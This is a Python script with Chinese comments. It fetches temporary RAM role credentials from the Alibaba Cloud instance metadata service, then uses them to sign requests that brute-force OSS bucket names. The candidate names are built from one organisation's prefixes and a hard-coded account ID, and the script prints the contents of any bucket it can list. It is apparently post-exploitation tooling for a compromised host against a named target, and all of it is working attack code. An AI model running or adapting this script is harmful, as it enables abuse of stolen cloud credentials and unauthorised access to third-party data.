#!/usr/bin/env python3
# 组合式探测 Bucket 名
import hmac, hashlib, base64, json, urllib.request, urllib.error, datetime, re, itertools, sys

META = "http://100.100.100.200/latest/meta-data/ram/security-credentials/JNDOSSImageRole"
HOST = "oss-cn-hongkong.aliyuncs.com"
ACC = "5490192474073133"

def get_cred():
    with urllib.request.urlopen(META, timeout=10) as r:
        return json.loads(r.read().decode())

def oss_sign(method, resource, cred):
    now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    h = {"x-oss-security-token": cred["SecurityToken"], "x-oss-date": now}
    canon = "".join(f"{k.lower()}:{v}\n" for k, v in sorted(h.items()))
    sts = f"{method}\n\n\n{now}\n{canon}{resource}"
    sig = base64.b64encode(hmac.new(cred["AccessKeySecret"].encode(), sts.encode(), hashlib.sha1).digest()).decode()
    headers = dict(h)
    headers["Date"] = now
    headers["Host"] = HOST
    headers["Authorization"] = f"OSS {cred['AccessKeyId']}:{sig}"
    return headers

def probe(bucket, cred):
    h = oss_sign("GET", f"/{bucket}/", cred)
    req = urllib.request.Request(f"https://{HOST}/{bucket}/?max-keys=2", headers=h, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception:
        return -1, ""

if __name__ == "__main__":
    cred = get_cred()
    pre = ["jnd", "jndoss", "jnd-oss", "jd", "jndimg", "jnd-image", "jndimg", "oss-jnd",
           "jndstatic", "jnd-static", "jndweb", "jnd-web", "jndmedia", "jnd-media",
           "jndproduct", "jnd-product", "jndgolf", "jnd-golf", "jndstore", "jnd-store"]
    suf = ["", "-oss", "-img", "-image", "-images", "-static", "-media", "-web", "-website",
           "-product", "-products", "-upload", "-uploads", "-photo", "-photos", "-storage",
           "-host", "-bucket", "-file", "-files", "-asset", "-assets", "-golf", "-shop",
           "-mall", "-site", "-cdn", "-hk", "-hongkong", "-prod", "-production", "-live"]
    cands = set()
    for p in pre:
        for s in suf:
            cands.add(p + s)
    # 阿里云控制台常自动追加账号 id
    for p in ["jnd", "jnd-oss", "jnd-image", "jndoss", "jndimg"]:
        cands.add(f"{p}-{ACC}")
        cands.add(f"{p}{ACC}")
    cands = sorted(cands)
    print(f"候选 {len(cands)} 个，开始探测...\n")
    hits = []
    for i, b in enumerate(cands):
        code, body = probe(b, cred)
        if code == 200:
            print(f"★★★ 200 {b}")
            hits.append(b)
            print(body[:600])
        elif code not in (404, 403):
            print(f"    {code} {b}  {body[:120]}")
    print("\n=== 命中 ===", hits)
